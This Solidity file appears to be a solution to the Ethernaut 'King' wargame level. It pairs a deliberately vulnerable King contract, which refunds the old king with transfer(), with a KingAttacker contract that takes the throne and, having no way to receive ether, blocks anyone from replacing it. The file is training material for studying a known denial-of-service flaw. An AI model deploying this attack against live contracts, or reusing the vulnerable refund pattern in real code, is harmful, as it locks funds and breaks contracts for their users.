// ||
// \/
// TAKEN FROM ETHERNAUT
// /\
// ||

// King of the Ether: https://www.kingoftheether.com/thrones/kingoftheether/index.html
// King of the Ether Postmortem: https://www.kingoftheether.com/postmortem.html

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {
    address king;
    uint public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}

contract KingAttacker {
    address payable private s_owner;
    King private s_victim;

    constructor(address victim) payable {
        s_owner = payable(msg.sender);
        (bool isSuccesed, ) = victim.call{value: msg.value}("");
        if (!isSuccesed) revert();
    }

    function die() external {
        address payable owner = s_owner;
        if (msg.sender != owner) revert();
        selfdestruct(owner);
    }
}
